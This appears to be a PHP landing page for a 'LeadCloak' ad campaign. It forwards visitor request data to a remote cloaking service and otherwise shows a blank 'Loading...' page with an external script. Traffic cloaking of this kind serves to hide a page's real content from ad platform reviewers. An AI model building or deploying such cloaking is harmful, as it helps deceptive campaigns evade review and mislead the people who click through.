<?php
/**
 * Campaign: AaronMTaylor623
 * Created: 2022-02-22 11:28:28 UTC
 */

require 'leadcloak-16rjxi6lssor.php';

// ---------------------------------------------------
// Configuration

// Set this to false if application is properly installed.
$enableDebugging = true;

// Set this to false if you won't want to log error messages
$enableLogging = true;

if ($enableDebugging) {
	isApplicationReadyToRun();
}

if (isPost())
{
	$data = httpRequestMakePayload($campaignId, $campaignSignature, $_POST);

	$response = httpRequestExec($data);

	httpHandleResponse($response, $enableLogging);

	exit();
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title></title>
    <style type="text/css">
        body {
            display: table;
            position: absolute;
            height: 100%;
            width: 100%;
            margin:0 0 0 0;
            left: 0;

        }

        #c7e04e2322f {
            display: table-cell;
            vertical-align: top;
        }

        .box {
            width: 100%;
            padding: 0;
            margin: 0 auto;
            text-align: left;
        }

        #textone {
            background: #fff;
            font-family: Times New Roman, Times, serif;
            font-size: 38px;
        }
    </style>
    <script type="text/javascript" src="16rjxi6lssor.js"></script>
</head>
<body>

<div id="c7e04e2322f">
    <div class="box" id="textone">
        
        <p class="content">Loading...</p>
    </div>
</div>

</body>
</html>